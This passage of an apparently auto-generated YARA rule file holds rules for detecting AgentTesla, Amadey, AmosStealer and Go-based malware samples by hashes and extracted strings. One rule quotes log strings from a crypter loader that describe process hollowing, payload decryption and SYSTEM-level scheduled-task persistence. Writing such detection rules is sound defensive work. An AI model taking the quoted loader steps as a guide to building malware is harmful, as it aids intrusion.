      $s15 = "schedule: holding locksinvalid m->lockedInt = runtime/internal/atomicprocresize: invalid argmisuse of profBuf.writeunexpected si" ascii /* score: '23.00'*/
   condition:
      ( uint16(0) == 0x457f and filesize < 17000KB and ( 1 of ($x*) and all of them )
      ) or ( all of them )
}

rule _8a7d7cc34c52dce3570005ebd59ab8b0_imphash__959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_98e8eae_57 {
   meta:
      description = "_subset_batch - from files 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash).exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
      hash2 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash3 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash4 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash5 = "1005065810ae3c06e48ea42e790775bd003451a8aea76a25331cbe9a55f701f2"
      hash6 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash7 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
      hash8 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash9 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "sync.runtime_SemacquireMutex" fullword ascii /* score: '21.00'*/
      $s2 = "sync.(*Mutex).lockSlow" fullword ascii /* score: '15.00'*/
      $s3 = "runtime.traceGCSweepStart" fullword ascii /* score: '15.00'*/
      $s4 = "runtime.traceGCSweepDone" fullword ascii /* score: '15.00'*/
      $s5 = "runtime.getRandomData" fullword ascii /* score: '15.00'*/
      $s6 = "runtime.traceGCSweepSpan" fullword ascii /* score: '15.00'*/
      $s7 = "runtime.getargp" fullword ascii /* score: '15.00'*/
      $s8 = "sync.(*Mutex).unlockSlow" fullword ascii /* score: '15.00'*/
      $s9 = "runtime.hashGrow" fullword ascii /* score: '13.00'*/
      $s10 = "runtime.traceBufPtr.ptr" fullword ascii /* score: '13.00'*/
      $s11 = "runtime.tophash" fullword ascii /* score: '13.00'*/
      $s12 = "tophash" fullword ascii /* score: '11.00'*/
      $s13 = "runtime.bucketShift" fullword ascii /* score: '10.00'*/
      $s14 = "runtime.fastrandn" fullword ascii /* score: '10.00'*/
      $s15 = "runtime.(*traceBufPtr).set" fullword ascii /* score: '10.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _a41097d27d1b14962ff14afe46b2196d_imphash__AgentTesla_signature__c9596ccdffde444fa435c5f9042f7548_imphash__Amadey_signature__58 {
   meta:
      description = "_subset_batch - from files a41097d27d1b14962ff14afe46b2196d(imphash).exe, AgentTesla(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, Amadey(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "72ac8cc42df3b7e913a8424004a82c930388c5dd0641a7200840bae2722f467d"
      hash2 = "239ec64b8c00bdc8603baaf441fc33bb14c14800051cf2d48d80345ff2966d9a"
      hash3 = "69e0d212862b36fc44f33e7a05d27b545db8e9d02d77e0770e5c947391ae7f78"
   strings:
      $s1 = ",System.Collections.dll:System.Collections.Concurrent" fullword ascii /* score: '19.00'*/
      $s2 = "@System.Security.Cryptography.dll System.Threading" fullword ascii /* score: '19.00'*/
      $s3 = "System.Collections.Generic.IEnumerable<System.Char>.GetEnumerator@" fullword ascii /* score: '15.00'*/
      $s4 = "RecycleId$GetCurrentThreadId" fullword ascii /* score: '15.00'*/
      $s5 = "RTryGetStaticRuntimeMethodHandleComponentsRGetMethodDescForStaticRuntimeMethodHandle4TryGetMetadataForNamedType" fullword ascii /* score: '15.00'*/
      $s6 = "Must complete Convert() operation or call Encoder.Reset() before calling GetBytes() or GetByteCount(). Encoder '{0}' fallback '{" wide /* score: '15.00'*/
      $s7 = "BResolveGenericVirtualMethodTarget@" fullword ascii /* score: '14.00'*/
      $s8 = "System.Collections.Generic.ICollection<System.Collections.Generic.KeyValuePair<TKey,TValue>>.CopyTo@" fullword ascii /* score: '13.00'*/
      $s9 = "TGetMethodDescForDynamicRuntimeMethodHandle@" fullword ascii /* score: '12.00'*/
      $s10 = "Stream length must be non-negative and less than 2^31 - 1 - origin" fullword wide /* score: '12.00'*/
      $s11 = "GetDecoder@" fullword ascii /* score: '11.00'*/
      $s12 = "Invalid attempt made to decrement the event's count below zero" fullword wide /* score: '11.00'*/
      $s13 = "CompareAnyKeys@" fullword ascii /* score: '10.00'*/
      $s14 = "nSystem.Numerics.INumberBase<nint>.TryConvertFromChecked" fullword ascii /* score: '10.00'*/
      $s15 = "System.Numerics.INumberBase<System.Int32>.TryConvertFromSaturating]" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__1ff43e683b799b78959121aacb9f0786_imphash__AgentTesla_signature__1ff43e683b799b78959121aacb9f0786_imph_59 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash)_ea39e8b7.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0d96551046ad9c205cabca0aa816b062a85a9cf3716486d74ae73976db00dd11"
      hash2 = "ea39e8b7e3c1b9f60c4702870811029c644fc6c16a09e9528031160ff0445f92"
   strings:
      $x1 = "System.Runtime, Version=4.2.1.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a&DllImportSearchPath" fullword ascii /* score: '32.00'*/
      $s2 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$UTF8EncodingSealedBSafeHandleZeroOrMinusOneIsInva" ascii /* score: '27.00'*/
      $s3 = "System.Core, Version=3.5.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089$UTF8EncodingSealedBSafeHandleZeroOrMinusOneIsInva" ascii /* score: '27.00'*/
      $s4 = "Thread.AbandonedMutexException" fullword ascii /* score: '21.00'*/
      $s5 = "Sleep2GetCurrentProcessorNumber" fullword ascii /* score: '20.00'*/
      $s6 = "4GenericEmptyEnumeratorBase0GenericEmptyEnumerator`14ArrayTypeMismatchException.BadImageFormatException.DataMisalignedException*" ascii /* score: '13.00'*/
      $s7 = "OnThreadExit\"GetApartmentState@" fullword ascii /* score: '12.00'*/
      $s8 = "&InitCultureDataCore InitUserOverride8InitializeUserDefaultCulture" fullword ascii /* score: '12.00'*/
      $s9 = "get_IsEnum\"get_ComponentSize" fullword ascii /* score: '12.00'*/
      $s10 = "descriptionC" fullword ascii /* score: '10.00'*/
      $s11 = ".GenericMethodDescriptor,MethodNameAndSignature RuntimeSignature,ConcurrentDictionary`2[" fullword ascii /* score: '10.00'*/
      $s12 = "(KeyNotFoundException@RandomizedStringEqualityComparer" fullword ascii /* score: '10.00'*/
      $s13 = "6ThrowNullReferenceException8ThrowObjectDisposedException2ThrowOutOfMemoryExceptionNThrowOutOfMemoryException_StringTooLongnThro" ascii /* score: '9.00'*/
      $s14 = "$get_CurrentCulture(get_InvariantCulture" fullword ascii /* score: '9.00'*/
      $s15 = "DivideByZeroException(DllNotFoundException" fullword ascii /* score: '9.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 6000KB and pe.imphash() == "1ff43e683b799b78959121aacb9f0786" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__1ff43e683b799b78959121aacb9f0786_imphash__AgentTesla_signature__1ff43e683b799b78959121aacb9f0786_imph_60 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash).exe, AgentTesla(signature)_1ff43e683b799b78959121aacb9f0786(imphash)_ea39e8b7.exe, AgentTesla(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "0d96551046ad9c205cabca0aa816b062a85a9cf3716486d74ae73976db00dd11"
      hash2 = "ea39e8b7e3c1b9f60c4702870811029c644fc6c16a09e9528031160ff0445f92"
      hash3 = "239ec64b8c00bdc8603baaf441fc33bb14c14800051cf2d48d80345ff2966d9a"
   strings:
      $s1 = "BSystem.Collections.Concurrent.dll" fullword ascii /* score: '26.00'*/
      $s2 = "System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089" fullword ascii /* score: '24.00'*/
      $s3 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic$get_SafeWaitHandle@" fullword ascii /* score: '20.00'*/
      $s4 = "Serialization(ConstrainedExecution\"ExceptionServices" fullword ascii /* score: '19.00'*/
      $s5 = "ExecutionDomain.ReflectionCoreExecution" fullword ascii /* score: '19.00'*/
      $s6 = "ModuleFixupCell PROCESSOR_NUMBER&RTL_OSVERSIONINFOEX" fullword ascii /* score: '18.00'*/
      $s7 = "2TypeLoaderExceptionHelper" fullword ascii /* score: '13.00'*/
      $s8 = "<GetInlinedThreadStaticBaseSlow" fullword ascii /* score: '12.00'*/
      $s9 = "GetOSVersion4GetEnvironmentVariableCoreLGetEnvironmentVariableCore_NoArrayPool" fullword ascii /* score: '12.00'*/
      $s10 = "IKeyedItem`1" fullword ascii /* score: '12.00'*/
      $s11 = "UninitializeCom2get_ReentrantWaitsEnabled.GetCurrentApartmentType" fullword ascii /* score: '12.00'*/
      $s12 = "4DecrementRunningForeground0WaitForForegroundThreads6GetOSHandleForCurrentThread" fullword ascii /* score: '12.00'*/
      $s13 = "4InitializeCommandLineArgsW" fullword ascii /* score: '12.00'*/
      $s14 = "LGetCultureNotSupportedExceptionMessage GetCultureByName" fullword ascii /* score: '12.00'*/
      $s15 = "*AppendCustomFormatter8AppendFormattedWithTempSpace@" fullword ascii /* score: '11.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 7000KB and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__AgentTesla_signature__6d242744_AgentTesla_signature__799e73863806df2964d80d12ce4e_61 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, AgentTesla(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash3 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
      hash4 = "239ec64b8c00bdc8603baaf441fc33bb14c14800051cf2d48d80345ff2966d9a"
   strings:
      $s1 = "PSystem.Collections.ICollection.get_Count0InitializeClosedInstance@" fullword ascii /* score: '18.00'*/
      $s2 = "add_ProcessExit@" fullword ascii /* score: '15.00'*/
      $s3 = "HDetermineMinSpinCountForAdaptiveSpin2GetWaiterForCurrentThread" fullword ascii /* score: '12.00'*/
      $s4 = "GetThreadContex" fullword wide /* score: '12.00'*/
      $s5 = "Wow64GetThreadContex" fullword wide /* score: '12.00'*/
      $s6 = ".GenericMethodDescriptor,MethodNameAndSignature RuntimeSignature$OpenMethodResolver" fullword ascii /* score: '10.00'*/
      $s7 = "<GetCorElementTypeOfElementType" fullword ascii /* score: '9.00'*/
      $s8 = "&get_HasLeftoverData>TryDrainLeftoverDataForGetBytes@" fullword ascii /* score: '9.00'*/
      $s9 = "\"get_CurrentDomain" fullword ascii /* score: '9.00'*/
      $s10 = "4GetConsoleScreenBufferInfo" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 9000KB and ( all of them )
      ) or ( all of them )
}

rule _99ae4d4e31aa2596f16fbacb8ac52b83_imphash__99ae4d4e31aa2596f16fbacb8ac52b83_imphash__3425243a_99ae4d4e31aa2596f16fbacb8ac52b_62 {
   meta:
      description = "_subset_batch - from files 99ae4d4e31aa2596f16fbacb8ac52b83(imphash).exe, 99ae4d4e31aa2596f16fbacb8ac52b83(imphash)_3425243a.exe, 99ae4d4e31aa2596f16fbacb8ac52b83(imphash)_4d3c00ec.exe, 99ae4d4e31aa2596f16fbacb8ac52b83(imphash)_af15f7f5.exe, 99ae4d4e31aa2596f16fbacb8ac52b83(imphash)_fa106729.exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "bdb5e8fcf29470ec8dd9acf8774f0f44b3a36875864d5626d26735734a758466"
      hash2 = "3425243ae4b06fc1d2e6cc87f54e828f98a0409c30aecd628911d098e3d05903"
      hash3 = "4d3c00ec377027bc1446156bd3e92586a2f2ffdc6dd73695fc5e4f55fd5ee897"
      hash4 = "af15f7f5cd412700480ef871ce62286816fa9dd198573e13a766630b69eceba1"
      hash5 = "fa1067298bed9e95fc864e95c91012d98593c019e1c11910fa6a1cee53263a78"
   strings:
      $x1 = "C:\\Users\\4674\\Documents\\GitHub\\CrypterFramework\\CrypterFramework_v3\\Release\\LoaderStub.pdb" fullword ascii /* score: '45.00'*/
      $s2 = "[-] FALLO: CreateProcessA no pudo crear el proceso host. Codigo: " fullword ascii /* score: '26.00'*/
      $s3 = "--- NUEVA EJECUCION (Process Hollowing) ---" fullword ascii /* score: '23.00'*/
      $s4 = "[+] LoaderStub iniciado." fullword ascii /* score: '17.00'*/
      $s5 = "[+] Escribiendo las secciones del payload en el proceso host..." fullword ascii /* score: '17.00'*/
      $s6 = "[+] Asignando memoria para el nuevo payload en el proceso host..." fullword ascii /* score: '17.00'*/
      $s7 = "[+] Payload descifrado con exito. Nuevo tamano: " fullword ascii /* score: '17.00'*/
      $s8 = "[-] FALLO CRITICO: No se encontro el recurso 'PAYLOAD'." fullword ascii /* score: '17.00'*/
      $s9 = "[+] Proceso host creado con PID: " fullword ascii /* score: '16.00'*/
      $s10 = "[-] No se pudo obtener la ruta de persistencia en AppData." fullword ascii /* score: '15.00'*/
      $s11 = "[+] Principal configurado para ejecutarse como SYSTEM con privilegios maximos." fullword ascii /* score: '14.00'*/
      $s12 = "[+] Instancia de ITaskService creada." fullword ascii /* score: '14.00'*/
      $s13 = "Payload ejecutado! Saliendo del LoaderStub original." fullword ascii /* score: '13.00'*/
      $s14 = "[-] FALLO: ITaskService->Connect. Codigo: " fullword ascii /* score: '13.00'*/
      $s15 = "[-] FALLO: CoCreateInstance no pudo crear ITaskService. Codigo: " fullword ascii /* score: '13.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 2000KB and pe.imphash() == "99ae4d4e31aa2596f16fbacb8ac52b83" and ( 1 of ($x*) and 4 of them )
      ) or ( all of them )
}

rule _AmosStealer_signature__088fd6d2_AmosStealer_signature__1da1dd59_AmosStealer_signature__4318942d_AmosStealer_signature__a738_63 {
   meta:
      description = "_subset_batch - from files AmosStealer(signature)_088fd6d2.macho, AmosStealer(signature)_1da1dd59.macho, AmosStealer(signature)_4318942d.macho, AmosStealer(signature)_a73803bb.macho"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "088fd6d2b778ad628e9bdbbde21ca86c562ac6784044ecd3cf85a6c704f60da1"
      hash2 = "1da1dd5976713f79edf7b4dff3668032c84b2dff02e5c22bdf85e5ec7a10aaf0"
      hash3 = "4318942d1382726c3e9d6cefc6e818c6c9b8fe61ac20c74ec93ad74060266e1b"
      hash4 = "a73803bbc3490dafece94c14112616fa82504427cf075812070f09e18b7449b4"
   strings:
      $s1 = "thread constructor failed" fullword ascii /* score: '12.00'*/
      $s2 = "@__ZTISt11logic_error" fullword ascii /* score: '12.00'*/
      $s3 = "@__ZTSSt11logic_error" fullword ascii /* score: '12.00'*/
      $s4 = "@__ZNSt11logic_errorC2EPKc" fullword ascii /* score: '12.00'*/
      $s5 = "__ZTSSt13runtime_error" fullword ascii /* score: '10.00'*/
      $s6 = "__ZNSt3__120__throw_system_errorEiPKc" fullword ascii /* score: '10.00'*/
      $s7 = "3runtime_error" fullword ascii /* score: '10.00'*/
      $s8 = "@__ZNSt13runtime_errorC1EPKc" fullword ascii /* score: '10.00'*/
      $s9 = "@__ZNSt13runtime_errorD1Ev" fullword ascii /* score: '10.00'*/
      $s10 = "@__ZTSSt13runtime_error" fullword ascii /* score: '10.00'*/
      $s11 = "__ZTISt13runtime_error" fullword ascii /* score: '10.00'*/
      $s12 = "@__ZNSt3__120__throw_system_errorEiPKc" fullword ascii /* score: '10.00'*/
      $s13 = "__ZNSt13runtime_errorC1EPKc" fullword ascii /* score: '10.00'*/
      $s14 = "__ZNSt13runtime_errorD1Ev" fullword ascii /* score: '10.00'*/
      $s15 = "@__ZTISt13runtime_error" fullword ascii /* score: '10.00'*/
   condition:
      ( uint16(0) == 0xfeca and filesize < 10000KB and ( 8 of them )
      ) or ( all of them )
}

rule _AgentTesla_signature__799e73863806df2964d80d12ce4e61ea_imphash__Amadey_signature__1a41b236e54319b64f65b4f667766e1e_imphash__64 {
   meta:
      description = "_subset_batch - from files AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, Amadey(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
      hash2 = "69e0d212862b36fc44f33e7a05d27b545db8e9d02d77e0770e5c947391ae7f78"
   strings:
      $s1 = "?StartProcessWithMojoIPC@PwaHelperImpl@edge_pwahelper@@QEAAKPEAXV?$unique_ptr@VCommandLine@base@@U?$default_delete@VCommandLine@" ascii /* score: '27.00'*/
      $s2 = "DumpHungProcessWithPtype_ExportThunk" fullword ascii /* score: '25.00'*/
      $s3 = "?StartProcessWithMojoIPC@PwaHelperImpl@edge_pwahelper@@QEAAKPEAXV?$unique_ptr@VCommandLine@base@@U?$default_delete@VCommandLine@" ascii /* score: '23.00'*/
      $s4 = "IsTemporaryUserDataDirectoryCreatedForHeadless" fullword ascii /* score: '19.00'*/
      $s5 = "EdgeGetInjectionMitigationStatus" fullword ascii /* score: '19.00'*/
      $s6 = "?InitializeAppUserModelIdForCurrentProcess@PwaHelperImpl@edge_pwahelper@@QEAA_NXZ" fullword ascii /* score: '18.00'*/
      $s7 = "GetInstallDetailsPayload" fullword ascii /* score: '18.00'*/
      $s8 = "InjectDumpForHungInput_ExportThunk" fullword ascii /* score: '17.00'*/
      $s9 = "IsBrowserProcess" fullword ascii /* score: '15.00'*/
      $s10 = "?BindWidgetManager@PwaHelperImpl@edge_pwahelper@@AEAAXV?$ScopedHandleBase@VMessagePipeHandle@mojo@@@mojo@@@Z" fullword ascii /* score: '15.00'*/
      $s11 = "?SetSingletonProcessId@PwaHelperImpl@edge_pwahelper@@UEAAXI@Z" fullword ascii /* score: '15.00'*/
      $s12 = "GetUploadConsent_ExportThunk" fullword ascii /* score: '14.00'*/
      $s13 = "GetCrashpadDatabasePath_ExportThunk" fullword ascii /* score: '12.00'*/
      $s14 = "?StartAppWithPlatformChannel@PwaHelperImpl@edge_pwahelper@@QEAAXV?$unique_ptr@VCommandLine@base@@U?$default_delete@VCommandLine@" ascii /* score: '12.00'*/
      $s15 = "GetUserDataDirectoryThunk" fullword ascii /* score: '12.00'*/
   condition:
      ( uint16(0) == 0x5a4d and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__a41097d27d1b14962ff14afe46b2196d_imphash__AgentTesla_signature__6d242744_AgentTes_65 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, a41097d27d1b14962ff14afe46b2196d(imphash).exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe, AgentTesla(signature)_c9596ccdffde444fa435c5f9042f7548(imphash).exe, Amadey(signature)_1a41b236e54319b64f65b4f667766e1e(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "72ac8cc42df3b7e913a8424004a82c930388c5dd0641a7200840bae2722f467d"
      hash3 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash4 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
      hash5 = "239ec64b8c00bdc8603baaf441fc33bb14c14800051cf2d48d80345ff2966d9a"
      hash6 = "69e0d212862b36fc44f33e7a05d27b545db8e9d02d77e0770e5c947391ae7f78"
   strings:
      $s1 = "DependentHandle\"TypeLoaderExports[" fullword ascii /* score: '16.00'*/
      $s2 = ".AbandonedMutexException" fullword ascii /* score: '15.00'*/
      $s3 = "<GetActualTargetFunctionPointer@" fullword ascii /* score: '14.00'*/
      $s4 = "SignalAll" fullword ascii /* base64 encoded string 'J('jP%' */ /* score: '14.00'*/
      $s5 = ".GetKeyNotFoundException" fullword ascii /* score: '12.00'*/
      $s6 = "There are too many threads currently waiting on the event. A maximum of {0} waiting threads are supported" fullword wide /* score: '10.00'*/
      $s7 = "Thread failed to start" fullword wide /* score: '10.00'*/
      $s8 = "$get_FallbackBuffer@" fullword ascii /* score: '9.00'*/
      $s9 = "$get_CurrentCulture$set_CurrentCulture" fullword ascii /* score: '9.00'*/
      $s10 = " get_FriendlyName" fullword ascii /* score: '9.00'*/
      $s11 = "4TypeForwardedFromAttribute" fullword ascii /* score: '9.00'*/
      $s12 = "encodin" fullword wide /* score: '8.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 12000KB and ( 8 of them )
      ) or ( all of them )
}

rule _8a7d7cc34c52dce3570005ebd59ab8b0_imphash__959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_98e8eae_66 {
   meta:
      description = "_subset_batch - from files 8a7d7cc34c52dce3570005ebd59ab8b0(imphash).exe, 959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb.elf, 98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5_98e8eaed.elf, 9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042_9a87d042.elf, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_04537b68.exe, 9cbefe68f395e67356e2a5d8d1b285c0(imphash)_4cfe5a07.exe, a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b_a1ff420c.elf, ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2_ab0306ce.elf"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "3d16dc942ec08ee48cd4949c939cb0f62d1b21f5e34580691d7632b1748f81b9"
      hash2 = "959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834"
      hash3 = "98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bbea280d52c9714a5"
      hash4 = "9a87d04294becdf4a20c7335e1cc607c20c666cace04d722cb80d138492db042"
      hash5 = "04537b68ef029a66a16e85052f829b6f6cc969fefe894e0c55f8048cc5ad74a6"
      hash6 = "4cfe5a076f8b5aeedafccaff49969c10d09468bbb795075099f10974248c23f8"
      hash7 = "a1ff420cb430a19ab0d3f90f6be8b6288d0e2b3eb4168809f61a6040cc62bb6b"
      hash8 = "ab0306cebfad50676b63f7d45bef9d830cfb40097b65d20816d6ce5b86ec1ba2"
   strings:
      $s1 = "encoding/binary.dataSize" fullword ascii /* score: '11.00'*/
      $s2 = "reflect.mapiterkey" fullword ascii /* score: '10.00'*/
      $s3 = "runtime.mapiternext" fullword ascii /* score: '10.00'*/
      $s4 = "runtime.convI2I" fullword ascii /* score: '10.00'*/
      $s5 = "strconv.max" fullword ascii /* score: '10.00'*/
      $s6 = "runtime.evacuate_fast64" fullword ascii /* score: '10.00'*/
      $s7 = "runtime.mapiterinit" fullword ascii /* score: '10.00'*/
      $s8 = "runtime.mapaccessK" fullword ascii /* score: '10.00'*/
      $s9 = "strconv.min" fullword ascii /* score: '10.00'*/
      $s10 = "runtime.growWork_fast64" fullword ascii /* score: '10.00'*/
      $s11 = "&*map.bucket[string]*unicode.RangeTable" fullword ascii /* score: '9.00'*/
      $s12 = "*[]*unicode.RangeTable" fullword ascii /* score: '9.00'*/
      $s13 = "*[8]*unicode.RangeTable" fullword ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x457f ) and filesize < 18000KB and ( 8 of them )
      ) or ( all of them )
}

rule _837fe6c9e243ff99b6590b36278aa82c_imphash__a41097d27d1b14962ff14afe46b2196d_imphash__AgentTesla_signature__6d242744_AgentTes_67 {
   meta:
      description = "_subset_batch - from files 837fe6c9e243ff99b6590b36278aa82c(imphash).exe, a41097d27d1b14962ff14afe46b2196d(imphash).exe, AgentTesla(signature)_6d242744.tar, AgentTesla(signature)_799e73863806df2964d80d12ce4e61ea(imphash).exe"
      author = "Metin Yigit"
      reference = "internal"
      date = "2025-09-26"
      hash1 = "da061f2bdb2a6d84d3e7d6b2045834655fe65418e9ad7281b4b689a3700dc003"
      hash2 = "72ac8cc42df3b7e913a8424004a82c930388c5dd0641a7200840bae2722f467d"
      hash3 = "6d242744cbee7249a48505d1447d984e9c912b904be4ea3dcccd07602ef5264d"
      hash4 = "7b3d435d322d7303446c5ce3308704a1d4d5a5b1e70abb44a19502be6baf2c79"
   strings:
      $s1 = "Templates* DesktopDirectory" fullword ascii /* score: '15.00'*/
      $s2 = "8GetSystemSupportsLeapSeconds>GetGetSystemTimeAsFileTimeFnPtr" fullword ascii /* score: '15.00'*/
      $s3 = "<GetInlinedThreadStaticBaseSlowFGetUninlinedThreadStaticBaseForType" fullword ascii /* score: '12.00'*/
      $s4 = ">GetThreadDeserializationTracker" fullword ascii /* score: '12.00'*/
      $s5 = "2RefreshCurrentProcessorId2ProcessorNumberSpeedCheck*UninlinedThreadStatic8CreateThreadLocalCountObject&AssignWorkItemQueue@" fullword ascii /* score: '11.00'*/
      $s6 = ".ComputeParametersString" fullword ascii /* score: '11.00'*/
      $s7 = "CommonTemplatesZ" fullword ascii /* score: '11.00'*/
      $s8 = "get_ValueVSystem.Threading.IAsyncLocal.OnValueChanged@" fullword ascii /* score: '11.00'*/
      $s9 = "UserProfileP*CommonProgramFilesX86X" fullword ascii /* score: '10.00'*/
      $s10 = "CDBurningv CommonAdminTools^" fullword ascii /* score: '9.00'*/
      $s11 = "GetEraName\"get_DateSeparator.get_FullDateTimePattern&get_LongDatePattern&get_LongTimePattern&get_MonthDayPattern(get_ShortDateP" ascii /* score: '9.00'*/
      $s12 = ":InternalGetGenitiveMonthNames:InternalGetLeapYearMonthNames.GetAbbreviatedMonthName" fullword ascii /* score: '9.00'*/
      $s13 = "\"GetPartitionCount0GetMaxArraysPerPartition<TryGetInt32EnvironmentVariable" fullword ascii /* score: '9.00'*/
      $s14 = "*GetSwitchDefaultValue" fullword ascii /* score: '9.00'*/
      $s15 = "GetEraName\"get_DateSeparator.get_FullDateTimePattern&get_LongDatePattern&get_LongTimePattern&get_MonthDayPattern(get_ShortDateP" ascii /* score: '9.00'*/
   condition:
      ( ( uint16(0) == 0x5a4d or uint16(0) == 0x7061 ) and filesize < 11000KB and ( 8 of them )
      ) or ( all of them )
}

rule _959833eb1fa1bc5e5d0b6578091bed5698eeaec06226012ece21a96528a6d834_959833eb_98e8eaeda4a91f3f8e75742fbd7fbdaf80e2e4cce9df3f0bb_68 {
   meta:
